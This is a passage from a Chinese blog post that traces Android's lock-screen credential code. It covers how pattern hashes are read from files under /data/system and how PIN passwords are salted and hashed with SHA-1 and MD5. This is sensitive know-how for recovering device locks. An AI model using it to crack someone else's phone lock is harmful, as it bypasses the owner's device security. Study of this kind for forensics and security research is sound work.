class="keyword">return</span> index;</span><br><span class="line"><span class="number">127</span>          &#125;</span><br><span class="line"><span class="number">128</span>  </span><br><span class="line"><span class="number">129</span>          <span class="comment">// If the key at the returned index matches, that&#x27;s what we want.</span></span><br><span class="line"><span class="number">130</span>          <span class="keyword">if</span> (key.equals(mArray[index&lt;&lt;<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="number">131</span>              <span class="keyword">return</span> index;</span><br><span class="line"><span class="number">132</span>          &#125;</span><br><span class="line"><span class="number">133</span>  </span><br><span class="line"><span class="number">134</span>          <span class="comment">// Search for a matching key after the index.</span></span><br><span class="line"><span class="number">135</span>          <span class="type">int</span> end;</span><br><span class="line"><span class="number">136</span>          <span class="keyword">for</span> (end = index + <span class="number">1</span>; end &lt; N &amp;&amp; mHashes[end] == hash; end++) &#123;</span><br><span class="line"><span class="number">137</span>              <span class="keyword">if</span> (key.equals(mArray[end &lt;&lt; <span class="number">1</span>])) <span class="keyword">return</span> end;</span><br><span class="line"><span class="number">138</span>          &#125;</span><br><span class="line"><span class="number">139</span>  </span><br><span class="line"><span class="number">140</span>          <span class="comment">// Search for a matching key before the index.</span></span><br><span class="line"><span class="number">141</span>          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index - <span class="number">1</span>; i &gt;= <span class="number">0</span> &amp;&amp; mHashes[i] == hash; i--) &#123;</span><br><span class="line"><span class="number">142</span>              <span class="keyword">if</span> (key.equals(mArray[i &lt;&lt; <span class="number">1</span>])) <span class="keyword">return</span> i;</span><br><span class="line"><span class="number">143</span>          &#125;</span><br><span class="line"><span class="number">144</span>  </span><br><span class="line"><span class="number">145</span>          <span class="comment">// Key not found -- return negative value indicating where a</span></span><br><span class="line"><span class="number">146</span>          <span class="comment">// new entry for this key should go.  We use the end of the</span></span><br><span class="line"><span class="number">147</span>          <span class="comment">// hash chain to reduce the number of array entries that will</span></span><br><span class="line"><span class="number">148</span>          <span class="comment">// need to be copied when inserting.</span></span><br><span class="line"><span class="number">149</span>          <span class="keyword">return</span> ~end;</span><br><span class="line"><span class="number">150</span>      &#125;</span><br></pre></td></tr></table></figure><h3 id="1-8-1-peekFile"><a href="#1-8-1-peekFile" class="headerlink" title="1.8.1 peekFile()"></a>1.8.1 peekFile()</h3><p>如果本地没有该文件，则执行<code>peekFile()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">798</span>          <span class="type">byte</span>[] peekFile(String fileName) &#123;</span><br><span class="line"><span class="number">799</span>              <span class="keyword">return</span> (<span class="type">byte</span>[]) peek(CacheKey.TYPE_FILE, fileName, -<span class="number">1</span> <span class="comment">/* userId */</span>);</span><br><span class="line"><span class="number">800</span>          &#125;<span class="comment">//转换为字节数组</span></span><br><span class="line"></span><br><span class="line"><span class="number">840</span>          <span class="keyword">private</span> <span class="keyword">synchronized</span> Object <span class="title function_">peek</span><span class="params">(<span class="type">int</span> type, String key, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">841</span>              <span class="keyword">return</span> mCache.get(mCacheKey.set(type, key, userId));</span><br><span class="line"><span class="number">842</span>          &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/android/util/ArrayMap.java</span></span><br><span class="line"><span class="number">419</span>      <span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="number">420</span>          <span class="keyword">final</span> <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> indexOfKey(key);</span><br><span class="line"><span class="number">421</span>          <span class="keyword">return</span> index &gt;= <span class="number">0</span> ? (V)mArray[(index&lt;&lt;<span class="number">1</span>)+<span class="number">1</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="number">422</span>      &#125;<span class="comment">//返回(V)mArray[3]</span></span><br><span class="line"></span><br><span class="line"><span class="number">376</span>      <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOfKey</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="number">377</span>          <span class="type">return</span> <span class="variable">key</span> <span class="operator">=</span>= <span class="literal">null</span> ? indexOfNull()</span><br><span class="line"><span class="number">378</span>                  : indexOf(key, mIdentityHashCode ? System.identityHashCode(key) : key.hashCode());<span class="comment">//返回值为1</span></span><br><span class="line"><span class="number">379</span>      &#125;</span><br></pre></td></tr></table></figure><p>回到<code>readPatternHashIfExists()</code>，往下执行。 ^1ead62</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">280</span>      <span class="keyword">private</span> CredentialHash <span class="title function_">readPatternHashIfExists</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">281</span>          <span class="type">byte</span>[] stored = readFile(getLockPatternFilename(userId));</span><br><span class="line"><span class="number">282</span>          <span class="keyword">if</span> (!ArrayUtils.isEmpty(stored)) &#123;</span><br><span class="line"><span class="number">283</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CredentialHash</span>(stored, LockPatternUtils.CREDENTIAL_TYPE_PATTERN,</span><br><span class="line"><span class="number">284</span>                      CredentialHash.VERSION_GATEKEEPER);</span><br><span class="line"><span class="number">285</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">97</span>          <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VERSION_GATEKEEPER</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">114</span>      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">CREDENTIAL_TYPE_PATTERN</span> <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/util/ArrayUtils.java</span></span><br><span class="line"><span class="number">160</span>      <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">(<span class="meta">@Nullable</span> <span class="type">byte</span>[] array)</span> &#123;</span><br><span class="line"><span class="number">161</span>          <span class="type">return</span> <span class="variable">array</span> <span class="operator">=</span>= <span class="literal">null</span> || array.length == <span class="number">0</span>;</span><br><span class="line"><span class="number">162</span>      &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">99</span>          <span class="keyword">private</span> <span class="title function_">CredentialHash</span><span class="params">(<span class="type">byte</span>[] hash, <span class="type">int</span> type, <span class="type">int</span> version)</span> &#123;</span><br><span class="line"><span class="number">100</span>              <span class="built_in">this</span>(hash, type, version, <span class="literal">false</span> <span class="comment">/* isBaseZeroPattern */</span>);</span><br><span class="line"><span class="number">101</span>          &#125;</span><br><span class="line"><span class="number">102</span>  </span><br><span class="line"><span class="number">103</span>          <span class="keyword">private</span> <span class="title function_">CredentialHash</span><span class="params">(<span class="type">byte</span>[] hash, <span class="type">int</span> type, <span class="type">int</span> version, <span class="type">boolean</span> isBaseZeroPattern)</span> &#123;</span><br><span class="line"><span class="number">104</span>              <span class="keyword">if</span> (type != LockPatternUtils.CREDENTIAL_TYPE_NONE) &#123;</span><br><span class="line"><span class="number">105</span>                  <span class="keyword">if</span> (hash == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">106</span>                      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Empty hash for CredentialHash&quot;</span>);</span><br><span class="line"><span class="number">107</span>                  &#125;</span><br><span class="line"><span class="number">108</span>              &#125; <span class="keyword">else</span> <span class="comment">/* type == LockPatternUtils.CREDENTIAL_TYPE_NONE */</span> &#123;</span><br><span class="line"><span class="number">109</span>                  <span class="keyword">if</span> (hash != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">110</span>                      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;None type CredentialHash should not have hash&quot;</span>);</span><br><span class="line"><span class="number">111</span>                  &#125;</span><br><span class="line"><span class="number">112</span>              &#125;</span><br><span class="line"><span class="number">113</span>              <span class="built_in">this</span>.hash = hash;</span><br><span class="line"><span class="number">114</span>              <span class="built_in">this</span>.type = type;</span><br><span class="line"><span class="number">115</span>              <span class="built_in">this</span>.version = version;</span><br><span class="line"><span class="number">116</span>              <span class="built_in">this</span>.isBaseZeroPattern = isBaseZeroPattern;</span><br><span class="line"><span class="number">117</span>          &#125;</span><br></pre></td></tr></table></figure><p>最终回到<code>readCredentialHash()</code>。[[锁屏密码加密算法分析#1.5 readCredentialHash()]]</p><h3 id="1-8-2-RandomAccessFile"><a href="#1-8-2-RandomAccessFile" class="headerlink" title="1.8.2 RandomAccessFile()"></a>1.8.2 RandomAccessFile()</h3><p>如果有该文件，继续执行<code>readFile()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">844</span>          <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">845</span>              <span class="keyword">return</span> mVersion;</span><br><span class="line"><span class="number">846</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">779</span>          <span class="keyword">private</span> <span class="type">int</span> <span class="variable">mVersion</span> <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/ojluni/src/main/java/java/io/RandomAccessFile.java</span></span><br><span class="line"><span class="number">138</span>      <span class="keyword">public</span> <span class="title function_">RandomAccessFile</span><span class="params">(String name, String mode)</span></span><br><span class="line"><span class="number">139</span>          <span class="keyword">throws</span> FileNotFoundException</span><br><span class="line"><span class="number">140</span>      &#123;</span><br><span class="line"><span class="number">141</span>          <span class="built_in">this</span>(name != <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">File</span>(name) : <span class="literal">null</span>, mode);</span><br><span class="line"><span class="number">142</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">220</span>      <span class="keyword">public</span> <span class="title function_">RandomAccessFile</span><span class="params">(File file, String mode)</span></span><br><span class="line"><span class="number">221</span>          <span class="keyword">throws</span> FileNotFoundException</span><br><span class="line"><span class="number">222</span>      &#123;</span><br><span class="line"><span class="number">223</span>          <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (file != <span class="literal">null</span> ? file.getPath() : <span class="literal">null</span>);</span><br><span class="line"><span class="number">224</span>          <span class="type">int</span> <span class="variable">imode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="number">225</span>          <span class="keyword">if</span> (mode.equals(<span class="string">&quot;r&quot;</span>)) &#123;</span><br><span class="line"><span class="number">226</span>              imode = O_RDONLY;</span><br><span class="line">...</span><br><span class="line"><span class="number">262</span>          <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">263</span>              <span class="comment">// Android-changed: different exception message in ctor when file == null.</span></span><br><span class="line"><span class="number">264</span>              <span class="comment">// throw new NullPointerException();</span></span><br><span class="line"><span class="number">265</span>              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;file == null&quot;</span>);</span><br><span class="line"><span class="number">266</span>          &#125;</span><br><span class="line"><span class="number">267</span>          <span class="keyword">if</span> (file.isInvalid()) &#123;<span class="comment">//文件路径包含空字符无效</span></span><br><span class="line"><span class="number">268</span>              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(<span class="string">&quot;Invalid file path&quot;</span>);</span><br><span class="line"><span class="number">269</span>          &#125;</span><br><span class="line"><span class="number">270</span>          <span class="built_in">this</span>.path = name;</span><br><span class="line"><span class="number">271</span>          <span class="built_in">this</span>.mode = imode;</span><br><span class="line"><span class="number">272</span>  </span><br><span class="line"><span class="number">273</span>          <span class="comment">// BEGIN Android-changed: Use IoBridge.open() instead of open.</span></span><br><span class="line"><span class="number">274</span>          fd = IoBridge.open(name, imode);</span><br><span class="line"><span class="number">275</span>          <span class="keyword">if</span> (syncMetadata) &#123;</span><br><span class="line"><span class="number">276</span>              <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">277</span>                  fd.sync();</span><br><span class="line"><span class="number">278</span>              &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="number">279</span>                  <span class="comment">// Ignored</span></span><br><span class="line"><span class="number">280</span>              &#125;</span><br><span class="line"><span class="number">281</span>          &#125;</span><br><span class="line"><span class="number">282</span>          guard.open(<span class="string">&quot;close&quot;</span>);</span><br><span class="line"><span class="number">283</span>          <span class="comment">// END Android-changed: Use IoBridge.open() instead of open.</span></span><br><span class="line"><span class="number">284</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">71</span>      <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">syncMetadata</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/ojluni/src/main/java/java/io/File.java</span></span><br><span class="line"><span class="number">190</span>      <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">isInvalid</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">191</span>          <span class="keyword">if</span> (status == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">192</span>              status = (<span class="built_in">this</span>.path.indexOf(<span class="string">&#x27;\u0000&#x27;</span>) &lt; <span class="number">0</span>) ? PathStatus.CHECKED</span><br><span class="line"><span class="number">193</span>                                                         : PathStatus.INVALID;</span><br><span class="line"><span class="number">194</span>          &#125;</span><br><span class="line"><span class="number">195</span>          <span class="type">return</span> <span class="variable">status</span> <span class="operator">=</span>= PathStatus.INVALID;</span><br><span class="line"><span class="number">196</span>      &#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/luni/src/main/java/libcore/io/IoBridge.java</span></span><br><span class="line"><span class="number">493</span>      <span class="keyword">public</span> <span class="keyword">static</span> FileDescriptor <span class="title function_">open</span><span class="params">(String path, <span class="type">int</span> flags)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line"><span class="number">494</span>          <span class="type">FileDescriptor</span> <span class="variable">fd</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">495</span>          <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">496</span>              <span class="comment">// On Android, we don&#x27;t want default permissions to allow global access.</span></span><br><span class="line"><span class="number">497</span>              <span class="type">int</span> <span class="variable">mode</span> <span class="operator">=</span> ((flags &amp; O_ACCMODE) == O_RDONLY) ? <span class="number">0</span> : <span class="number">0600</span>;</span><br><span class="line"><span class="number">498</span>              fd = Libcore.os.open(path, flags, mode);<span class="comment">//以“r”权限打开文件</span></span><br><span class="line"><span class="number">499</span>              <span class="comment">// Posix open(2) fails with EISDIR only if you ask for write permission.</span></span><br><span class="line"><span class="number">500</span>              <span class="comment">// Java disallows reading directories too.</span></span><br><span class="line"><span class="number">501</span>              <span class="keyword">if</span> (S_ISDIR(Libcore.os.fstat(fd).st_mode)) &#123;<span class="comment">//是否是目录文件</span></span><br><span class="line"><span class="number">502</span>                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ErrnoException</span>(<span class="string">&quot;open&quot;</span>, EISDIR);</span><br><span class="line"><span class="number">503</span>              &#125;</span><br><span class="line"><span class="number">504</span>              <span class="keyword">return</span> fd;</span><br><span class="line"><span class="number">505</span>          &#125; <span class="keyword">catch</span> (ErrnoException errnoException) &#123;</span><br><span class="line"><span class="number">506</span>              <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">507</span>                  <span class="keyword">if</span> (fd != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">508</span>                      IoUtils.close(fd);</span><br><span class="line"><span class="number">509</span>                  &#125;</span><br><span class="line"><span class="number">510</span>              &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line"><span class="number">511</span>              &#125;</span><br><span class="line"><span class="number">512</span>              <span class="type">FileNotFoundException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(path + <span class="string">&quot;: &quot;</span> + errnoException.getMessage());</span><br><span class="line"><span class="number">513</span>              ex.initCause(errnoException);</span><br><span class="line"><span class="number">514</span>              <span class="keyword">throw</span> ex;</span><br><span class="line"><span class="number">515</span>          &#125;</span><br><span class="line"><span class="number">516</span>      &#125;</span><br></pre></td></tr></table></figure><p>读好以后将返回值存到stored字节数组中。[[锁屏密码加密算法分析#1.8 readFile()]]</p><h3 id="1-8-3-readFully"><a href="#1-8-3-readFully" class="headerlink" title="1.8.3 readFully()"></a>1.8.3 readFully()</h3><p>将stored字节数组存入到一个随机访问文件当中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/ojluni/src/main/java/java/io/DataInputStream.java</span></span><br><span class="line"><span class="number">193</span>      <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">readFully</span><span class="params">(<span class="type">byte</span> b[], <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="number">194</span>          <span class="keyword">if</span> (len &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">195</span>              <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>();</span><br><span class="line"><span class="number">196</span>          <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">197</span>          <span class="keyword">while</span> (n &lt; len) &#123;</span><br><span class="line"><span class="number">198</span>              <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> in.read(b, off + n, len - n);</span><br><span class="line"><span class="number">199</span>              <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">200</span>                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EOFException</span>();</span><br><span class="line"><span class="number">201</span>              n += count;</span><br><span class="line"><span class="number">202</span>          &#125;</span><br><span class="line"><span class="number">203</span>      &#125;</span><br></pre></td></tr></table></figure><p>最后返回stored到<code>readPatternHashIfExists()</code>，新建一个实例<code>CredentialHash()</code>。[[锁屏密码加密算法分析#^1ead62]]</p><p>这样就可以得到patternHash，也就是storedHash了。</p><p>但经过查找目录发现手机中并没有<code>/data/system/gatekeeper.pattern.key</code>。那就进入<code>getBaseZeroLockPatternFilename()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">466</span>      <span class="keyword">private</span> String <span class="title function_">getBaseZeroLockPatternFilename</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">467</span>          <span class="keyword">return</span> getLockCredentialFilePathForUser(userId, BASE_ZERO_LOCK_PATTERN_FILE);</span><br><span class="line"><span class="number">468</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">77</span>      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_ZERO_LOCK_PATTERN_FILE</span> <span class="operator">=</span> <span class="string">&quot;gatekeeper.gesture.key&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">475</span>      <span class="keyword">private</span> String <span class="title function_">getLockCredentialFilePathForUser</span><span class="params">(<span class="type">int</span> userId, String basename)</span> &#123;</span><br><span class="line"><span class="number">476</span>          <span class="type">String</span> <span class="variable">dataSystemDirectory</span> <span class="operator">=</span> Environment.getDataDirectory().getAbsolutePath() +</span><br><span class="line"><span class="number">477</span>                          SYSTEM_DIRECTORY;</span><br><span class="line"><span class="number">478</span>          <span class="keyword">if</span> (userId == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">479</span>              <span class="comment">// Leave it in the same place for user 0</span></span><br><span class="line">    <span class="comment">// /data/system/gatekeeper.gesture.key</span></span><br><span class="line"><span class="number">480</span>              <span class="keyword">return</span> dataSystemDirectory + basename;</span><br><span class="line"><span class="number">481</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">482</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(Environment.getUserSystemDirectory(userId), basename).getAbsolutePath();</span><br><span class="line"><span class="number">483</span>          &#125;</span><br><span class="line"><span class="number">484</span>      &#125;</span><br></pre></td></tr></table></figure><p>也没有<code>/data/system/gatekeeper.gesture.key</code>文件，继续看<code>getLegacyLockPatternFilename()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">457</span>      String <span class="title function_">getLegacyLockPatternFilename</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">458</span>          <span class="keyword">return</span> getLockCredentialFilePathForUser(userId, LEGACY_LOCK_PATTERN_FILE);</span><br><span class="line"><span class="number">459</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">78</span>      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LEGACY_LOCK_PATTERN_FILE</span> <span class="operator">=</span> <span class="string">&quot;gesture.key&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">475</span>      <span class="keyword">private</span> String <span class="title function_">getLockCredentialFilePathForUser</span><span class="params">(<span class="type">int</span> userId, String basename)</span> &#123;</span><br><span class="line"><span class="number">476</span>          <span class="type">String</span> <span class="variable">dataSystemDirectory</span> <span class="operator">=</span> Environment.getDataDirectory().getAbsolutePath() +</span><br><span class="line"><span class="number">477</span>                          SYSTEM_DIRECTORY;</span><br><span class="line"><span class="number">478</span>          <span class="keyword">if</span> (userId == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">479</span>              <span class="comment">// Leave it in the same place for user 0</span></span><br><span class="line">    <span class="comment">// /data/system/gesture.key</span></span><br><span class="line"><span class="number">480</span>              <span class="keyword">return</span> dataSystemDirectory + basename;</span><br><span class="line"><span class="number">481</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">482</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(Environment.getUserSystemDirectory(userId), basename).getAbsolutePath();</span><br><span class="line"><span class="number">483</span>          &#125;</span><br><span class="line"><span class="number">484</span>      &#125;</span><br></pre></td></tr></table></figure><p>还是没有啊…</p><p>使用Android 5.0系统的模拟器，发现确实有<code>gesture.key</code>，而且与我们算的数据一样。[[锁屏密码加密算法分析#^7da60a]] 也就是说Android 8.1.0虽然保留了这些函数，但是没有用到，而是用的另一套API来实现密码功能。</p><h1 id="2-数字密码加密算法分析"><a href="#2-数字密码加密算法分析" class="headerlink" title="2. 数字密码加密算法分析"></a>2. 数字密码加密算法分析</h1><h2 id="2-1-passwordToHash"><a href="#2-1-passwordToHash" class="headerlink" title="2.1 passwordToHash()"></a>2.1 passwordToHash()</h2><p>在我们分析手势密码的过程中应该见到不少有关数字密码的信息，所以直接找<code>passwordToHash()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">1091</span>      <span class="keyword">public</span> <span class="type">byte</span>[] passwordToHash(String password, <span class="type">int</span> userId) &#123;</span><br><span class="line"><span class="number">1092</span>          <span class="keyword">if</span> (password == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1093</span>              <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">1094</span>          &#125;</span><br><span class="line"><span class="number">1095</span>  </span><br><span class="line"><span class="number">1096</span>          <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">1097</span>              <span class="type">byte</span>[] saltedPassword = (password + getSalt(userId)).getBytes();</span><br><span class="line"><span class="number">1098</span>              <span class="type">byte</span>[] sha1 = MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>).digest(saltedPassword);</span><br><span class="line"><span class="number">1099</span>              <span class="type">byte</span>[] md5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>).digest(saltedPassword);</span><br><span class="line"><span class="number">1100</span>  </span><br><span class="line"><span class="number">1101</span>              